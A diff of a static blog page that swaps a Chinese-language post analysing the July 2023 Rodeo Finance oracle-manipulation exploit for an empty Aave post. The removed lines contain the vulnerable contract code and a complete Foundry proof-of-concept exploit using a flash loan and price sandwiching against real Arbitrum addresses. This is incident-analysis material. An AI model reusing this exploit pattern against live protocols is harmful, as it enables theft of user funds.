@@ -4,9 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="20230711 RodeoFinance, Blog">
-    <meta name="description" content="攻击介绍2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。
-攻击分析攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与">
+    <meta name="keywords" content="Aave分析, Blog">
+    <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>20230711 RodeoFinance | Blog</title>
+    <title>Aave分析 | Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -283,12 +282,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">20230711 RodeoFinance</h1>
+                    <h1 class="description center-align post-title">Aave分析</h1>
                 </div>
             </div>
         </div>
@@ -324,28 +323,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-11-03
+                    2024-03-08
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-01-17
+                    2024-03-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    680
+                    0
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    1 分
                 </div>
                 
 
@@ -365,161 +364,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。</p>
-<h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与 unshETH 的准备金比率来检查价格。同时攻击者能够通过具有未配置策略地址的 earn 函数强制平台将 USDC 兑换为 unshETH。由于价格预言机存在缺陷，滑点控制无法生效。(具体可见Meth为0x7b37c42b的交易)。</p>
-<pre><code>function earn(address usr, address pol, uint256 str, uint256 amt, uint256 bor, bytes calldata dat)
-  external
-  loop
-  returns (uint256)
-{
-  if (status &lt; S_LIVE) revert WrongStatus();
-  if (!pools[pol]) revert InvalidPool();
-  if (strategies[str] == address(0)) revert InvalidStrategy();
-  uint256 id = nextPosition++;
-  Position storage p = positions[id];
-  p.owner = usr;
-  p.pool = pol;
-  p.strategy = str;
-  p.outset = block.timestamp;
-  pullTo(IERC20(IPool(p.pool).asset()), msg.sender, address(actor), uint256(amt));
-  (int256 bas, int256 sha, int256 bar) = actor.edit(id, int256(amt), int256(bor), dat);
-  p.amount = uint256(bas);
-  p.shares = uint256(sha);
-  p.borrow = uint256(bar);
-  emit Edit(id, int256(amt), int256(bor), sha, bar);
-  return id;
-}
-</code></pre>
-<p>其次unshETH价格使用了TWAP，是计算45分钟内的最后4次更新价格实例的平均值，导致攻击者可以通过”三明治”来控制价格，从而套利。</p>
-<pre><code>function latestAnswer() external view returns (int256) {
-  require(block.timestamp &lt; lastTimestamp + (updateInterval * 2), "stale price");
-  int256 price = (prices[0] + prices[1] + prices[2] + prices[3]) / 4;
-  return price;
-}
-</code></pre>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.10;
-
-import "forge-std/Test.sol";
-import "./interface.sol";
-
-// Vulnerable Contract : 0xf3721d8a2c051643e06bf2646762522fa66100da
-// Attack Tx : 0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a
-
-
-interface IInvestor {
-    function earn(
-        address usr,
-        address pol,
-        uint256 str,
-        uint256 amt,
-        uint256 bor,
-        bytes memory dat
-    ) external returns (uint256);
-}
-
-interface ICamelotRouter {
-    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        address referrer,
-        uint256 deadline
-    ) external;
-}
-
-interface ISwapRouter {
-    struct ExactInputParams {
-        bytes path;
-        address recipient;
-        uint256 deadline;
-        uint256 amountIn;
-        uint256 amountOutMinimum;
-    }
-
-    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
-}
-
-contract RodeoTest is Test {
-    IERC20 unshETH = IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);
-    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
-    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
-    IInvestor Investor = IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);
-    ICamelotRouter Router = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
-    ISwapRouter SwapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    address private constant usdcPool = 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
-    function setUp() public {
-        cheats.createSelectFork("arbitrum", 110_043_452);
-        cheats.label(address(unshETH), "unsETH");
-        cheats.label(address(WETH), "WETH");
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(Investor), "Investor");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(SwapRouter), "SwapRouter");
-        cheats.label(address(Vault), "Vault");
-    }
-
-    function testExploit() public {
-
-        deal(address(unshETH), address(this), 47_294_222_088_336_002_957);
-        unshETH.approve(address(Router), type(uint256).max);
-        WETH.approve(address(Router), type(uint256).max);
-        USDC.approve(address(SwapRouter), type(uint256).max);
-
-        Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));
-       
-        swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));
-        swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));
-
-        swapUSDCToWETH();
-        takeWETHFlashloanOnBalancer();
-
-    }
-
-    function receiveFlashLoan(
-        address[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory userData
-    ) external {
-        
-        swapTokens(amounts[0], address(WETH), address(USDC));
-        
-        swapUSDCToWETH();
-        
-        WETH.transfer(address(Vault), amounts[0]);
-    }
-
-    function swapTokens(uint256 amountIn, address fromToken, address toToken) internal {
-        address[] memory path = new address[](2);
-        path[0] = fromToken;
-        path[1] = toToken;
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn, 0, path, address(this), address(0), block.timestamp + 100
-        );
-    }
-
-    function swapUSDCToWETH() internal {
-        bytes memory path = abi.encodePacked(address(USDC), uint24(500), address(WETH));
-        ISwapRouter.ExactInputParams memory params =
-            ISwapRouter.ExactInputParams(path, address(this), block.timestamp + 100, USDC.balanceOf(address(this)), 0);
-        SwapRouter.exactInput(params);
-    }
-
-    function takeWETHFlashloanOnBalancer() internal {
-        address[] memory tokens = new address[](1);
-        tokens[0] = address(WETH);
-        uint256[] memory amounts = new uint256[](1);
-        amounts[0] = 30e18;
-        Vault.flashLoan(address(this), tokens, amounts, bytes(""));
-    }
-}
-</code></pre>
-
+                
                 
             </div>
             <hr/>
@@ -545,7 +390,7 @@ contract RodeoTest is Test {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://willcking.github.io/2023/11/03/20230711-RodeoFinance/">https://willcking.github.io/2023/11/03/20230711-RodeoFinance/</a>
+                    <a href="https://willcking.github.io/2024/03/08/Aave%E5%88%86%E6%9E%90/">https://willcking.github.io/2024/03/08/Aave%E5%88%86%E6%9E%90/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -663,13 +508,13 @@ contract RodeoTest is Test {
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/01/17/ERC721A%E8%A7%A3%E6%9E%90/">
+                <a href="/2024/03/17/Calldata-%E8%A7%A3%E6%9E%90/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="ERC721A解析">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Calldata 解析">
                         
-                        <span class="card-title">ERC721A解析</span>
+                        <span class="card-title">Calldata 解析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -680,7 +525,7 @@ contract RodeoTest is Test {
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-01-17
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-17
                         </span>
                         <span class="publish-author">
                             
@@ -700,13 +545,13 @@ contract RodeoTest is Test {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/10/26/20230717-NewFi/">
+                <a href="/2024/03/08/compund%E5%88%86%E6%9E%90/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="20230717 NewFi">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="compund分析">
                         
-                        <span class="card-title">20230717 NewFi</span>
+                        <span class="card-title">compund分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -717,7 +562,7 @@ contract RodeoTest is Test {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-08
                             </span>
                         <span class="publish-author">
                             
